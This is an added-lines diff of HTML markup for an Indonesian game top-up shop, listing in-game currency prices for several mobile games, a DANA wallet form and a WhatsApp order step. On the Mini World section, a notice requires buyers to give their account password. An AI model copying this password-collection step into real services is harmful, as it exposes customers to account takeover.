+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 6vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME BLOCKMAN GO</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="BLOCKMAN GO_0"> NO</th><th>Gcubes / Card<b></th><th><b> HARGA </th><th><b>TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="BLOCKMAN GO_1">60 Gcubes</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 18.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBG60G,18500,BLOCKMAN GO,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="BLOCKMAN GO_2">300 Gcubes</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 83.000;00<br></font></b><del style="color:red"><i>Rp. 84.500;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBG300G,83000,BLOCKMAN GO,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="BLOCKMAN GO_3">600 Gcubes</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 169.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBG600G,169000,BLOCKMAN GO,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="BLOCKMAN GO_4">GOLD MONTHLY CARD</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 85.000;00<br></font></b><del style="color:red"><i>Rp. 86.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBGGMC,85000,BLOCKMAN GO,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+           <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>5</td><td id="BLOCKMAN GO_5">DAZZLING MONTHLY CARD</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 167.000;00<br></font></b><del style="color:red"><i>Rp. 168.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBGDMC,167000,BLOCKMAN GO,5,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+        </table>
+<br>
+</div></div>
+<div id="GENSHIN IMPACT" name="GAMES" hidden>
+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 6vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME GENSHIN IMPACT</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="GENSHIN IMPACT_0"> NO</th><th>GC / Card<b></th><th><b> HARGA </th><th><b> TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="GENSHIN IMPACT_1">60 GC</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 13.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUGI60GC,13500,GENSHIN IMPACT,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="GENSHIN IMPACT_2">330 GC</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 65.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUGI330GC,65000,GENSHIN IMPACT,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="GENSHIN IMPACT_3">1090 GC</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 192.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUGI1090GC,192000,GENSHIN IMPACT,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="GENSHIN IMPACT_4" style="font-size: 2vw">BLESSING OF THE WELKIN MOON</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 65.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUGIBWM,65000,GENSHIN IMPACT,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+        </table>
+<br>
+</div></div>
+<div id="DANA" hidden>
+    <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 7vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP SALDO DANA</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+      <table border="4" id="table_" class="tableS" style="border: 1vw solid cyan; box-shadow: 0 1vw 0 cyan,0 0 2vw cyan inset;">
+          <tr style="color: white; font-style:italic; font-size:2.5vw; background-color:black">
+            <th><b class="tabels">JUMLAH YANG DI TRANSFER TOTAL</th><th><b>TOMBOL PESANAN STATUS</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff">
+          <td><input type="number" id="in_1" oninput="jum_sal(this)" style="width: 35vw; height: 10vw; font-size: 8vw; text-align: center; font-weight: 600; border: 0.3vw solid orangered; margin: 2vw; color: red" value="0" form="neks" required></td><td><label><input id="out_1" type="checkbox" name="subRadio" style="width: 10vw; height: 10vw;" value="null,0,null,0,0,0" onclick="document.getElementById('range_to').value=0;document.getElementById('jumtot').innerHTML='Jumlah: 1x';range_to=1;"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff">
+          <td
+          ><p id="saldo_pajak" style="color: orangered; font-size: 3.5vw;">pajak umum: Rp. +1.000;00</p>
+          <p style="color: orangered; font-size: 3.5vw;" style="">per pembayaran!</p>
+          </td><td><p id="saldo_status" style="color: white; font-size: 3.5vw;">STATUS</p><a id="status_1" style="color: red; font-size: 3.5vw; font-weight: 750;">batas saldo: 200.000;00</a></td></tr>
+        </table>
+    <br>
+  </div></div>
+  <div id="MOBILE LEGENDS" name="GAMES" hidden>
+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 5vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME MOBILE LEGENDS</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="MOBILE LEGENDS_0"> NO</th><th> DIAMONDS / Card<b></th><th><b> HARGA</th><th><b> TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="MOBILE LEGENDS_1">5 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 1.500;00<br></font></b><del style="color:red"><i>Rp. 2.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML5DM,1500,MOBILE LEGENDS,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="MOBILE LEGENDS_2">28 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 9.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML28DM,9000,MOBILE LEGENDS,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="MOBILE LEGENDS_3">74 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 21.500;00<br></font></b><del style="color:red"><i>Rp. 22.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML74DM,21500,MOBILE LEGENDS,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="MOBILE LEGENDS_4">110 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 31.500;00<br></font></b><del style="color:red"><i>Rp. 32.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML110DM,31500,MOBILE LEGENDS,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>5</td><td id="MOBILE LEGENDS_5">148 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 42.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML148DM,42000,MOBILE LEGENDS,5,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>6</td><td id="MOBILE LEGENDS_6">170 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 48.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML170DM,48500,MOBILE LEGENDS,6,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>7</td><td id="MOBILE LEGENDS_7">222 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 64.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML222DM,64000,MOBILE LEGENDS,7,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>8</td><td id="MOBILE LEGENDS_8">240 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 69.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML240DM,69000,MOBILE LEGENDS,8,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>9</td><td id="MOBILE LEGENDS_9">284 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 82.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML284DM,82000,MOBILE LEGENDS,9,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>10</td><td id="MOBILE LEGENDS_10">370 DIAMONDS 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 114.000;00<br></font></b><del style="color:red"><i>Rp. 116.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUML370DM,114000,MOBILE LEGENDS,10,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>11</td><td id="MOBILE LEGENDS_11">WEELKY DIAMONDS PASS</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 30.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUMLWDP,30000,MOBILE LEGENDS,11,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr><p id="0" hidden>Rp. ;00</p>
+        </table>
+<br>
+</div></div>
+<div id="MINI WORLD CREATA" name="GAMES" hidden>
+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 5vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME MINI WORLD CREATA</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="MINI WORLD CREATA_0"> NO</th><th> MINI COIN<b></th><th><b> HARGA </th><th><b>TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="MINI WORLD CREATA_1">100² MINI COIN<sup style="color:yellow"> 1x pembelian</sup></td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 32.000;00<br></font></b><del style="color:red"><i>Rp. 33.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUMWC100²MC,32000,MINI WORLD,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="MINI WORLD CREATA_2">300² MINI COIN<sup style="color:yellow"> 1x pembelian</sup></td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 99.000;00<br></font></b><del style="color:red"><i>Rp. 100.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUMWC300²MC,99000,MINI WORLD,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="MINI WORLD CREATA_3">50 MINI COIN</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 18.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUMWC50MC,18500,MINI WORLD,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="MINI WORLD CREATA_4">250 MINI COIN</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 81.000;00<br></font></b><del style="color:red"><i>Rp. 82.500;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUMWC250MC,81000,MINI WORLD,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+           <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>5</td><td id="MINI WORLD CREATA_5">500 MINI COIN</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 175.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUMWC500MC,175000,MINI WORLD,5,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+        </table><p style="margin: 6vw auto 0; color: red; background-color: white; width: fit-content; height: auto; padding: 5vw; font-size: 5vw; text-align: center">Syarat!<br><font style="font-size: 3vw; color: black">Anda harus memberikan kata sandi akun!<br>Jika ingin lebih aman ada cukup pakai saldo anda atau top up dana jika ingin membelinya!</font><br><button type="button" onclick="setTimeout(()=>{rang('2');document.getElementById('range').value='2';},800);loby1()" >beli sekarang</button></p>
+<br>
+</div></div>
+<div id="BLOOD STRIKE" name="GAMES" hidden>
+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 6vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME BLOOD STRIKE</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="BLOOD STRIKE_0"> NO</th><th>Gold / Card<b></th><th><b> HARGA </th><th><b>TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="BLOOD STRIKE_1">105 Gold</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 13.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBS105G,13500,BLOOD STRIKE,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="BLOOD STRIKE_2">320 Gold</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 40.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBS320G,40000,BLOOD STRIKE,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="BLOOD STRIKE_3">540 Gold</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 66.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBS540G,66500,BLOOD STRIKE,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="BLOOD STRIKE_4">1100 Gold</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 133.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBS1100G,133000,BLOOD STRIKE,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+           <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>5</td><td id="BLOOD STRIKE_5">STRIKE PASS ELITE</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 53.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBSSPE,53000,BLOOD STRIKE,5,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+           <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>6</td><td id="BLOOD STRIKE_6">STRIKE PASS PREMIUM</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 125.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUBSSPP,125000,BLOOD STRIKE,6,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+        </table>
+<br>
+</div></div>
+<div id="FC MOBILE" name="GAMES" hidden>
+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 6vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME FC MOBILE</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="FC MOBILE_0"> NO</th><th>FC POINTS / Silver<b></th><th><b> HARGA </th><th><b>TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="FC MOBILE_1">40 FC POINTS</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 7.500;00<br></font></b><del style="color:red"><i>Rp. 8.500;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFC40P,7500,FC MOBILE,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="FC MOBILE_2">100 FC POINTS</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 17.500;00<br></font></b><del style="color:red"><i>Rp. 18.500;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFC100P,17500,FC MOBILE,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="FC MOBILE_3">520 FC POINTS</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 82.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFC520P,82000,FC MOBILE,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="FC MOBILE_4">39 Silver</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 7.500;00<br></font></b><del style="color:red"><i>Rp. 8.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFC39S,7500,FC MOBILE,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+           <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>5</td><td id="FC MOBILE_5">99 Silver</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 17.500;00<br></font></b><del style="color:red"><i>Rp. 18.500;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFC99S,17500,FC MOBILE,5,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>6</td><td id="FC MOBILE_6">499 Silver</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 81.000;00<br></font></b><del style="color:red"><i>Rp. 82.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFC499S,81000,FC MOBILE,6,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+        </table>
+<br>
+</div></div>
+</div>
+  <div class="ut_ba"></div>
+  <div class="box_top">
+    <button class="iconrwz" id="butt_rwz" type="button" onclick="menu_A()"></button>
+    <p class="title_web">TOP-UP RAWIZAAD_768</p>
+    <div class="name_user">
+      <p style="text-align: center">BY: R.WILDAN Z A</p>
+        <p id="name_user" hidden>Pelanggan: 
+        <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...
+        </font></font></p>
+      </div>
+    <i id="button_menu" class="fa-solid fa-bars button_menu" onclick="menu()"></i>
+  </div>
+  <div class="box_down" id="box_down">
+    <img style="width: 28vw; height: 20vw; position: relative; bottom: 0; left: -6vw" src="https://i.imgur.com/xf2KIIn.png" alt="DIAMOND" hidden>
+    <i class="fa-solid fa-cart-shopping" style="font-size: 11vw; position: relative; top: 6vw; right: -1.5vw"></i>
+    <p id="katgor" style="font-weight: 1000; font-size: 4.5vw; margin: 2vw;">Game</p>
+    <form id="neks" onsubmit="return false">
+    <button id="button_inner" type="submit" class="button_s" onclick="pesananme()">BELI NO</button></form>
+    <div class="tot_top">
+      <p style="font-weight: 550; font-size: 2.5vw; margin: 0.5vw 14vw">PESANAN:</p>
+      <p id="hartot1" style="font-size: 2.5vw; margin: 1vw 1vw; font-weight: 400">Jumlah harga: Rp. 0;00</p>
+      <p id="hartot2" style="font-size: 2.5vw; margin: 1vw 1vw; font-weight: 400">Pajak: Rp. 0;00</p>
+      <p id="jumtot" style="font-size: 2.5vw; margin: 1vw 1vw; font-weight: 400">Jumlah: 1x</p>
+      <input type="range" max="10" min="1" value="1"  id="range_to" style="position: absolute; top: 8vw; right: -1vw; width: 25vw; height: 10vw;" oninput="range_jum(this.value);">
+      <p id="jumtot3" style="font-weight: 700; font-size: 2.5vw; margin: 1vw 1vw;">Total harga: Rp. 0;00</p>
+    </div>
+  </div>
+    <div class="h_menu" id="h_menu" onclick="menu()" hidden></div>
+    <div class="menu" id="menu"><p style="position: absolute; top: -4vw; left: 0; font-size: 3.5vw; color: green" id="salut">Saldo: 
+      <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...
+      </font></font><br>
+      <font color="#FF5200">Utang: 
+      <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...
+      </font></font></font></p>
+    <img onclick="menu()" class="img_B" src="https://i.imgur.com/69tkIYr.png">
+      <img class="img_b" src="https://i.imgur.com/gLDwc4S.jpeg"><br><p style="font-size: 4vw; color: blue" id="level_up">LEVEL: 
+      <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...
+      </font></font></p><hr><i class="fa-solid fa-user">
+        <a href="#" onclick="menu()"> PROFIL AKUN</a>
+    </i><hr><i class="fa-solid fa-gear">
+        <a href="#" onclick="menu()"> PENGATURAN</a>
+    </i><hr><i class="fa-solid fa-right-from-bracket" style="color: red"><a href="#" onclick="menu()" style="color: red"> LOGOUT</a></i><hr>
+  </div>
+  <!---->
+  <div class="peringatan-dialog" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #f7f7f7; padding: 1vw; border-radius: 10%; box-shadow: 0 0 1vw rgba(0, 0, 0, 0.1); z-index: 1000; width: 75vw; border: 1vw outset orangered; display: none; justify-items: center" id="peringatan_k">
+    <p class="teks-peringatan" style="font-size: 5vw; color: red; margin-bottom: 20px; font-weight: 800">PERINGATAN!</p>
+  <img src="https://i.imgur.com/oI3djoB.jpeg" alt="Gambar Peringatan" style="width: 60vw; height: 80vw; margin: 0 7vw; border: 0.8vw outset olivedrab">
+  <p class="teks-peringatan" style="font-size: 3.5vw; color: #666; margin: 3vw 10vw 0vw 10vw;">Selepas selaesai anda akan dimasukan ke WhatsApp untuk mengirim kode top-up tersebut!</p>
+  <p class="teks-peringatan" style="font-size: 3.5vw; color: #666; margin: 0 10vw 3vw 10vw;">Setelah itu kirim!</p>
+  <div class="persetujuan" style="margin-bottom: 20px;">
+    <input type="checkbox" id="setuju" required style="margin-right: 10px; width: vw; height: 5vw" form="stj" onclick="if(!this.checked){document.getElementById('b_stj').style.backgroundColor='#102C0A';}else{document.getElementById('b_stj').style.backgroundColor='#43B72B';};">
+    <label style="font-size: 3.2vw">Saya tidak akan merubah kodenya!</label>
+  </div><form id="stj" onsubmit="return false">
+  <button class="tombol-oke" type="submit" style="background-color: #102C0A; color: #fff; text-align: center; border: none; border-radius: 5px; cursor: pointer;" id="b_stj" onclick="stj = document.getElementById('setuju');if(stj.checked){document.getElementById('peringatan_k').style.display='none';go_submit();};">
+  Oke, lanjut!
+  </button></form>
+</div>
+<!---->
